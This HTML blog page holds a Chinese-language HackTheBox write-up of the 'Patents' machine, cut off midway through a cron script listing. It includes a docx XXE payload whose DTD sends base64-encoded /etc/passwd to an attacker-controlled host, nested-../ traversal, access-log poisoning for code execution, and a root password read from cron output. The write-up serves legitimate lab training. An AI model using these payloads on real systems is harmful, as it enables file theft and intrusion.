@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Patents - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;224  10.10.10.173  端口扫描                                                                                                            80 一个Patents管理系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Patents - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/05/21/Patents-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;224  10.10.10.173  端口扫描                                                                                                            80 一个Patents管理系统">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051801.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051802.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051803.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051804.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051805.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051806.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051807.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051808.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051809.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051810.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051811.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051812.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051813.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051814.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051818.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051819.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051816.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051817.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051901.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051902.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051903.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051904.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051905.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051906.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051907.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051908.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051909.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051910.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052001.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052002.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052003.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052004.jpg">
+<meta property="article:published_time" content="2020-05-21T05:04:20.000Z">
+<meta property="article:modified_time" content="2020-05-21T05:05:45.669Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051801.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Patents - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Patents - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-05-21T05:04:20.000Z" itemprop="datePublished" class="page-time">
+  2020-05-21
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-173"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.173</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">目录扫描</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#docx-xxe"><span class="post-toc-number">3.</span> <span class="post-toc-text">docx xxe</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#XXE-LFI"><span class="post-toc-number">4.</span> <span class="post-toc-text">XXE LFI</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-passwd"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-apache2-sites-enabled-000-default-conf"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#var-www-html-docx2pdf-config-php"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">&#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf&#x2F;config.php</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LFI-to-RCE"><span class="post-toc-number">5.</span> <span class="post-toc-text">LFI to RCE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#LFI"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">LFI</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#log-file"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">log file</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#reverse-shell"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">reverse shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">6.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#checker-client"><span class="post-toc-number">7.</span> <span class="post-toc-text">checker_client</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#run-file-sh"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">run_file.sh</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#checker-py"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">checker.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#usr-src-lfm"><span class="post-toc-number">8.</span> <span class="post-toc-text">&#x2F;usr&#x2F;src&#x2F;lfm</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lfmserver"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">lfmserver</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#逆向分析"><span class="post-toc-number">9.</span> <span class="post-toc-text">逆向分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#FUN-004055c2"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">FUN_004055c2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#FUN-00403ad9"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">FUN_00403ad9</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#FUN-00402db9"><span class="post-toc-number">9.3.</span> <span class="post-toc-text">FUN_00402db9</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Exploit-Development"><span class="post-toc-number">10.</span> <span class="post-toc-text">Exploit Development</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注意点"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">注意点</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-shell"><span class="post-toc-number">11.</span> <span class="post-toc-text">root shell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#lsblk-amp-mount"><span class="post-toc-number">12.</span> <span class="post-toc-text">lsblk &amp; mount</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">13.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#使用的exp"><span class="post-toc-number">14.</span> <span class="post-toc-text">使用的exp</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">15.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Patents-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Patents - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-05-21 13:04:20" datetime="2020-05-21T05:04:20.000Z"  itemprop="datePublished">2020-05-21</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/224" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/224</a></p>
+</li>
+<li><h2 id="10-10-10-173"><a href="#10-10-10-173" class="headerlink" title="10.10.10.173"></a>10.10.10.173</h2></li>
+</ul>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p> 一个Patents管理系统，存在一个上传接口，上传docx转换成pdf：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.173&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -x php -b 403,404</span><br></pre></td></tr></table></figure>
+
+<p>发现一个release目录，进一步扫描：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>发现更新log文件：</p>
+<p><a href="http://10.10.10.173/release/UpdateDetails" target="_blank" rel="noopener">http://10.10.10.173/release/UpdateDetails</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>里面提到Docx2Pdf的相关漏洞</p>
+<h1 id="docx-xxe"><a href="#docx-xxe" class="headerlink" title="docx xxe"></a>docx xxe</h1><p>docx解压后里面是xml文件，可以尝试进行XXE：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>添加一个xml进去，重新打包成docx：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>监听端口，上传生成的docx，收到请求，说明存在XXE：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>接下来需要做的就是通过XXE读取文件搜集信息</p>
+<h1 id="XXE-LFI"><a href="#XXE-LFI" class="headerlink" title="XXE LFI"></a>XXE LFI</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cat read.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % read &quot;&lt;!ENTITY exfil SYSTEM &#39;http:&#x2F;&#x2F;10.10.14.106:7777&#x2F;exfil?%file;&#39;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">cat customXml&#x2F;item1.xml</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.14.106:7777&#x2F;read.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">%read;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;exfil;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传，收到请求，base64解码后是读取的文件内容：</p>
+<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>得到一个用户名 ： <code>gbyolo</code></p>
+<h2 id="etc-apache2-sites-enabled-000-default-conf"><a href="#etc-apache2-sites-enabled-000-default-conf" class="headerlink" title="/etc/apache2/sites-enabled/000-default.conf"></a>/etc/apache2/sites-enabled/000-default.conf</h2><p>前面扫描结果中有config.php，但直接去读/var/www/html/config.php是失败的，应该不是在默认的根目录，所以先读配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">  DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf</span><br><span class="line"></span><br><span class="line">  &lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf&#x2F;&gt;</span><br><span class="line">      Options -Indexes +FollowSymLinks +MultiViews</span><br><span class="line">      AllowOverride All</span><br><span class="line">      Order deny,allow</span><br><span class="line">      Allow from all</span><br><span class="line">  &lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">  ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">  CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="var-www-html-docx2pdf-config-php"><a href="#var-www-html-docx2pdf-config-php" class="headerlink" title="/var/www/html/docx2pdf/config.php"></a>/var/www/html/docx2pdf/config.php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># needed by convert.php</span><br><span class="line">$uploadir &#x3D; &#39;letsgo&#x2F;&#39;;</span><br><span class="line"></span><br><span class="line"># needed by getPatent.php</span><br><span class="line"># gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it&#39;s vulnerable</span><br><span class="line">define(&#39;PATENTS_DIR&#39;, &#39;&#x2F;patents&#x2F;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现提示信息，getPatent_alphav1.0.php是存在漏洞的, 但无法直接读取这个文件的内容。</p>
+<h1 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI to RCE"></a>LFI to RCE</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>直接去访问getPatent_alphav1.0.php,提示通过ID读取内容：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>直接尝试目录遍历读取失败：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>但使用两次<code>../</code>嵌套的话，成功，说明后端处理应该是简单的移除掉一次<code>../</code>：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>所以这里也存在一个LFI</p>
+<h2 id="log-file"><a href="#log-file" class="headerlink" title="log file"></a>log file</h2><p>同样，我们也可以读取log文件<code>var/log/apache2/access.log</code> ,注意会直接输出客户端信息例如UA,：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051813.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>如果将UA修改为php代码，那么响应的log中就会直接显示执行后的结果(如果前面扫描产生的日志太多，建议reset一下机器)：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051814.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>直接修改代码，反弹shell, 注意编码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051818.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051819.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这个只是www-root用户，上传个pspy64收集信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.14.106:7777/pspy64 -o pspy64</span><br><span class="line"></span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=853    | /usr/sbin/CRON -f</span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=855    | /bin/sh -c env PASSWORD="!gby0l0r0ck\$\$!" /opt/checker_client/run_file.sh</span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=856    |</span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=857    | python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD /var/www/html/docx2pdf/convert.php</span><br></pre></td></tr></table></figure>
+
+<p>注意到env中直接有一个密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!gby0l0r0ck$$!</span><br></pre></td></tr></table></figure>
+
+<p>使用这个密码可以su切到root，但这个root并不是最终目标,  现在只是在docker里：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051816.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用上面得到的root，可以在用户目录得到user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051817.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="checker-client"><a href="#checker-client" class="headerlink" title="checker_client"></a>checker_client</h1><p>前面也看到是cron运行的/opt/checker_client下的相关文件，我们检查下这些文件：</p>
+<h2 id="run-file-sh"><a href="#run-file-sh" class="headerlink" title="run_file.sh"></a>run_file.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cat run_file.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> $(date) &gt; /opt/checker_runned</span><br><span class="line"></span><br><span class="line">FOLDER=/var/www/html/docx2pdf</span><br><span class="line">FILE=/var/www/html/docx2pdf/convert.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#export PASSWORD="!gby0l0r0ck\$\$!"</span></span><br><span class="line"></span><br><span class="line">NEWFILE=$(python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD <span class="variable">$FILE</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo "Res: $NEWFILE"</span></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$NEWFILE</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"File not corrupted."</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$NEWFILE</span> ]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"File corrupted. Copying new file..."</span></span><br><span class="line">   cp <span class="variable">$NEWFILE</span> <span class="variable">$FILE</span></span><br><span class="line">   <span class="keyword">if</span> 